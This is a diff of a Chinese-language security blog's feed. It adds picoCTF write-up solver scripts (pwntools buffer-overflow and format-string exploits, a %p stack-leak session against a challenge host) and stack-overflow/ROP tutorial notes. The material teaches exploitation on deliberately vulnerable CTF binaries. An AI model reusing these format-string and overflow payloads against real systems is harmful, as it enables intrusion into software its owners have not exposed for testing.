+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">from&lt;/span> pwn &lt;span style="color:#ff79c6">import&lt;/span> &lt;span style="color:#ff79c6">*&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>binary &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;./chall&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>os &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;linux&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>arch &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;amd64&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>log_level &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;DEBUG&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">if&lt;/span> args&lt;span style="color:#ff79c6">.&lt;/span>REMOTE:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;tethys.picoctf.net&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> port &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">58053&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p &lt;span style="color:#ff79c6">=&lt;/span> remote(ip, port)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p &lt;span style="color:#ff79c6">=&lt;/span> process()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>sendline(&lt;span style="color:#f1fa8c">b&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;5&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>sendline(&lt;span style="color:#f1fa8c">b&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;2&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>sendline(&lt;span style="color:#f1fa8c">b&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;35&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>sendline(&lt;span style="color:#f1fa8c">b&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;A&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">*&lt;/span>&lt;span style="color:#bd93f9">30&lt;/span>&lt;span style="color:#ff79c6">+&lt;/span>&lt;span style="color:#f1fa8c">b&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;pico&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>sendline(&lt;span style="color:#f1fa8c">b&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;4&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>interactive()
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="format-string-0">format string 0&lt;/h2>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-py" data-lang="py">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">#!/usr/bin/env python3&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">from&lt;/span> pwn &lt;span style="color:#ff79c6">import&lt;/span> &lt;span style="color:#ff79c6">*&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>binary &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;./format-string-0&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>os &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;linux&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>arch &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;amd64&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>log_level &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;DEBUG&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">if&lt;/span> args&lt;span style="color:#ff79c6">.&lt;/span>REMOTE:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;mimas.picoctf.net&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> port &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">56256&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p &lt;span style="color:#ff79c6">=&lt;/span> remote(ip, port)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p &lt;span style="color:#ff79c6">=&lt;/span> process()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>sendline(&lt;span style="color:#f1fa8c">&amp;#34;Gr&lt;/span>&lt;span style="color:#f1fa8c">%114d&lt;/span>&lt;span style="color:#f1fa8c">_Cheese&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>sendline(&lt;span style="color:#f1fa8c">&amp;#34;Cla&lt;/span>&lt;span style="color:#f1fa8c">%s&lt;/span>&lt;span style="color:#f1fa8c">ic_Che&lt;/span>&lt;span style="color:#f1fa8c">%s%s&lt;/span>&lt;span style="color:#f1fa8c">teak&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>interactive()
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="format-string-1">format string 1&lt;/h2>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>$ nc mimas.picoctf.net &lt;span style="color:#bd93f9">51583&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Decode this: &lt;span style="color:#ff79c6">(&lt;/span> &lt;span style="color:#ff79c6">(&lt;/span>cyberchef&lt;span style="color:#ff79c6">)&lt;/span> swap endianness &lt;span style="color:#bd93f9">8&lt;/span> bits, from hex &lt;span style="color:#ff79c6">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x7b4654436f636970,0x355f31346d316e34,0x3478345f33317937,0x31655f673431665f,0x7d383130386531
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="format-string-2">format string 2&lt;/h2>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-py" data-lang="py">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">#!/usr/bin/env python3&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">from&lt;/span> pwn &lt;span style="color:#ff79c6">import&lt;/span> &lt;span style="color:#ff79c6">*&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>binary &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;./vuln&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>os &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;linux&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>arch &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;amd64&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>log_level &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;DEBUG&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">if&lt;/span> args&lt;span style="color:#ff79c6">.&lt;/span>REMOTE:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;rhea.picoctf.net&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> port &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">63480&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p &lt;span style="color:#ff79c6">=&lt;/span> remote(ip, port)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p &lt;span style="color:#ff79c6">=&lt;/span> process()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">def&lt;/span> &lt;span style="color:#50fa7b">exec_fmt&lt;/span>(payload):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> args&lt;span style="color:#ff79c6">.&lt;/span>REMOTE:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p &lt;span style="color:#ff79c6">=&lt;/span> remote(ip, port)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p &lt;span style="color:#ff79c6">=&lt;/span> process()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p&lt;span style="color:#ff79c6">.&lt;/span>sendline(payload)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> p&lt;span style="color:#ff79c6">.&lt;/span>recvall() 
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>fmt &lt;span style="color:#ff79c6">=&lt;/span> FmtStr(exec_fmt)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>offset &lt;span style="color:#ff79c6">=&lt;/span> fmt&lt;span style="color:#ff79c6">.&lt;/span>offset
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#ff79c6">=&lt;/span> fmtstr_payload(offset, {&lt;span style="color:#bd93f9">0x404060&lt;/span>: &lt;span style="color:#bd93f9">0x67616c66&lt;/span>})
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>sendline(payload)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>interactive()
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div></description></item><item><title>【系統安全】Stack Overflow</title><link>https://ja-errorpro.codes/posts/2024/stack_overflow/</link><pubDate>Fri, 05 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/stack_overflow/</guid><description>&lt;h1 id="先備知識">先備知識&lt;/h1>
 &lt;ul>
 &lt;li>&lt;a href="https://ja-errorpro.codes/posts/2023/asm/">【系統安全】組合語言&lt;/a>&lt;/li>
 &lt;li>&lt;a href="https://ja-errorpro.codes/posts/2023/linux_system_security/">【系統安全】Linux 安全機制&lt;/a>&lt;/li>
@@ -1098,7 +1837,27 @@ combine the AI and CTI applications.&lt;/p>
 &lt;li>x64: System V AMD64 ABI，前 6 個整數參數依序放在 rdi, rsi, rdx, rcx, r8, r9, 後面如果還有才會放在 stack 上。&lt;/li>
 &lt;/ul>
 &lt;h2 id="stack-overflow-1">Stack Overflow&lt;/h2>
-&lt;p>當程式輸入資料的大小超過 buffer 的大小，會蓋到該 buffer 之後的記憶體，稱為 Overflow，而 Stack Overflow 表示在 stack 上發生了 Overflow。另外還有 Heap Overflow 表示在 heap 上發生了 Overflow。&lt;/p></description></item><item><title>【CTF-WriteUp】AIS3 Pre-Exam 2024</title><link>https://ja-errorpro.codes/posts/2024/ais3_pre_exam_2024/</link><pubDate>Tue, 11 Jun 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_pre_exam_2024/</guid><description>&lt;h1 id="ais3-pre-exam-2024">AIS3 Pre-Exam 2024&lt;/h1>
+&lt;p>當程式輸入資料的大小超過 buffer 的大小，會蓋到該 buffer 之後的記憶體，稱為 Overflow，而 Stack Overflow 表示在 stack 上發生了 Overflow。另外還有 Heap Overflow 表示在 heap 上發生了 Overflow。&lt;/p>
+&lt;h2 id="concept">Concept&lt;/h2>
+&lt;ul>
+&lt;li>尋找危險函式，可以確認是否有 buffer overflow，常見的危險函式有 gets, scanf, strcpy, strcat, sprintf, vsprintf&lt;/li>
+&lt;li>確定 padding 長度，計算要蓋到的地址離 buffer 的距離&lt;/li>
+&lt;li>如果要蓋 return address，直接看 frame pointer 位置然後找出偏移&lt;/li>
+&lt;li>如果要蓋 stack 上特定資料，需要先觀察 stack 上的資料再找出偏移&lt;/li>
+&lt;li>希望透過覆蓋記憶體位址來控制程式的執行流程&lt;/li>
+&lt;/ul>
+&lt;h2 id="rop">ROP&lt;/h2>
+&lt;ul>
+&lt;li>用於繞過 NX 保護的漏洞利用技術&lt;/li>
+&lt;li>利用程式碼已有的片段，拼出想要的功能，而控制程式執行流程&lt;/li>
+&lt;li>這些片段稱為 gadget，通常以 ret 結尾&lt;/li>
+&lt;li>可使用 ROPgadget, ropper, pwntools 來找 gadget&lt;/li>
+&lt;/ul>
+&lt;h2 id="ret2win">ret2win&lt;/h2>
+&lt;h2 id="ret2shellcode">ret2shellcode&lt;/h2>
+&lt;h2 id="ret2syscall">ret2syscall&lt;/h2>
+&lt;h2 id="ret2libc">ret2libc&lt;/h2>
+&lt;h2 id="got">GOT&lt;/h2></description></item><item><title>【CTF-WriteUp】AIS3 Pre-Exam 2024</title><link>https://ja-errorpro.codes/posts/2024/ais3_pre_exam_2024/</link><pubDate>Tue, 11 Jun 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_pre_exam_2024/</guid><description>&lt;h1 id="ais3-pre-exam-2024">AIS3 Pre-Exam 2024&lt;/h1>
 &lt;p>先放結果&lt;/p>
 &lt;p>&lt;img src="https://ja-errorpro.codes/images/ctf/ais3_pre_exam_2024/result.png" alt="result">&lt;/p>
 &lt;p>&lt;img src="https://ja-errorpro.codes/images/ctf/ais3_pre_exam_2024/result2.png" alt="result2">&lt;/p>
@@ -1116,7 +1875,66 @@ combine the AI and CTI applications.&lt;/p>
 &lt;p>AIS3{Welc0me_to_AIS3_PreExam_2o24!}&lt;/p>
 &lt;h3 id="quantum-nim-heist">Quantum Nim Heist&lt;/h3>
